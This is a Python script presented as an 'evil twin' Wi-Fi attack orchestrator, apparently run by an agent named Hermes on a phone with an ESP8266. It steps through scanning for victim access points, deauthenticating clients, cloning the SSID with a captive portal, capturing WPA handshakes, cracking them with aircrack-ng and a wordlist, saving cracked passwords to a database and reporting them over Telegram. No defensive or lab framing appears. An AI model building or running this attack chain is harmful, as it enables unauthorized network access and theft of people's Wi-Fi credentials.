#!/usr/bin/env python3
"""
mt2_attack.py — Full evil twin attack orchestrator (Hermes runs this).

After you flash the ESP8266 firmware via esptool APK, this script:
  1. Scans for victim APs (via ESP8266 serial/WiFi link)
  2. Triggers deauth to disconnect clients
  3. Starts evil twin AP on same SSID (esp-side)
  4. Captures handshakes to /sdcard/MT2/captures/
  5. Cracks handshakes with aircrack-ng + wordlist
  6. Reports results to /sdcard/MT2/captured.db
  7. Notifies user (Hermes Telegram bridge)

Transport: tries in order
  - TCP: 192.168.4.1:23 (MT2-LINK AP, if v2.1 firmware)
  - Serial: /dev/ttyUSB0 / ttyACM0 (if USB available)
  - Manual: prompts user to paste ESP output

Note: with esptool APK, no transport is available automatically.
User must run 'esptool --port /dev/ttyUSB0 write_flash ...' first,
then either:
  a) Reboot ESP normally (firmware runs) — output via Serial
  b) Use 'esphttpupdate' OTA if v2.1 is loaded
"""
import sys, time, json, os, sqlite3
from pathlib import Path

CAPTURE_DIR = Path("/sdcard/MT2/captures")
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH     = Path("/sdcard/MT2/captured.db")
WORDLIST    = Path("/sdcard/MT2/wordlist.txt")

def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS creds(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts INTEGER, ssid TEXT, bssid TEXT, password TEXT, src_ip TEXT
    )""")
    con.execute("""CREATE TABLE IF NOT EXISTS handshakes(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts INTEGER, ssid TEXT, bssid TEXT, pcap_path TEXT, cracked INTEGER
    )""")
    con.commit()
    con.close()

def log(msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)

def scan_phase():
    """Phase 1: scan and pick target."""
    log("Phase 1: Scan networks")
    log("ESP8266 → 'scan' command expected.")
    log("User action: connect via serial console / WiFi, run: scan")
    log("Then: list, note target idx, then target <idx>")

def deauth_phase(target_idx, duration=30):
    """Phase 2: deauth clients from real AP."""
    log(f"Phase 2: Deauth on target #{target_idx} for {duration}s")
    log(f"ESP8266 → 'target {target_idx}' then 'deauth'")

def twin_phase(ssid):
    """Phase 3: bring up evil twin."""
    log(f"Phase 3: Evil twin AP '{ssid}' — captive portal on :80")
    log("ESP8266 → 'twin <ssid>' (if firmware supports)")
    log("Or: start hostapd_clone.py in Termux")

def capture_phase(ssid, bssid, duration=60):
    """Phase 4: capture handshake + portal creds."""
    log(f"Phase 4: Handshake capture → /sdcard/MT2/captures/")
    log(f"ESP8266 → 'cap {ssid}.pcap' for {duration}s")
    log("Run on phone: cd /sdcard/MT2 && python3 hostapd_clone.py {ssid}")

def crack_phase(pcap_path, wordlist=WORDLIST):
    """Phase 5: offline crack with aircrack-ng."""
    log(f"Phase 5: Crack {pcap_path}")
    if not Path(wordlist).exists():
        log(f"  Wordlist missing: {wordlist}")
        log("  Install rockyou.txt: pkg install wordlists")
        return None
    try:
        import subprocess
        r = subprocess.run(
            ["aircrack-ng", "-w", str(wordlist), "-e", "any", str(pcap_path)],
            capture_output=True, text=True, timeout=300
        )
        if "KEY FOUND" in r.stdout:
            for line in r.stdout.split("\n"):
                if "KEY FOUND" in line:
                    key = line.split("[")[-1].split("]")[0]
                    log(f"  CRACKED: {key}")
                    return key
        log("  Not cracked (try bigger wordlist)")
        return None
    except FileNotFoundError:
        log("  aircrack-ng not installed: pkg install aircrack-ng")
        return None

def report_phase(ssid, password, src_ip=None):
    """Phase 6: save + report."""
    init_db()
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO creds(ts,ssid,bssid,password,src_ip) VALUES(?,?,?,?,?)",
                (int(time.time()), ssid, "?", password, src_ip or "?"))
    con.commit()
    con.close()
    log(f"Saved: ssid={ssid} password={password}")
    log(f"DB: {DB_PATH}")
    log("Hermes will report to Telegram.")

def menu():
    print("""
========================================
 MT2 Attack Orchestrator (Hermes)
========================================
 1. scan       - scan for target APs
 2. deauth     - deauth clients from real AP
 3. twin       - start evil twin
 4. capture    - capture handshake to SD
 5. crack      - offline crack with aircrack
 6. status     - show captured creds
 7. full       - run full attack (1→5)
 0. quit
""")

def cmd_full():
    """Run the full attack chain (Hermes will prompt for each step)."""
    log("=== FULL ATTACK CHAIN ===")
    log("Step 1: ESP8266 'scan' → list")
    log("Step 2: target <idx>")
    log("Step 3: deauth (keep running)")
    log("Step 4: cap <file>.pcap (parallel)")
    log("Step 5: stop, then 'crack' from this menu")
    log("")
    log("After flash: use 'mt2ctl' or direct serial for steps 1-4")

if __name__ == "__main__":
    init_db()
    if len(sys.argv) < 2:
        menu()
        sys.exit(0)
    cmd = sys.argv[1]
    if cmd == "scan":     scan_phase()
    elif cmd == "deauth":  deauth_phase(0)
    elif cmd == "twin":    twin_phase("FreeWiFi")
    elif cmd == "capture": capture_phase("victim", "?")
    elif cmd == "crack":   crack_phase(CAPTURE_DIR / "victim.pcap")
    elif cmd == "status":
        con = sqlite3.connect(DB_PATH)
        for r in con.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 20"):
            print(r)
        con.close()
    elif cmd == "full":    cmd_full()
    else: menu()
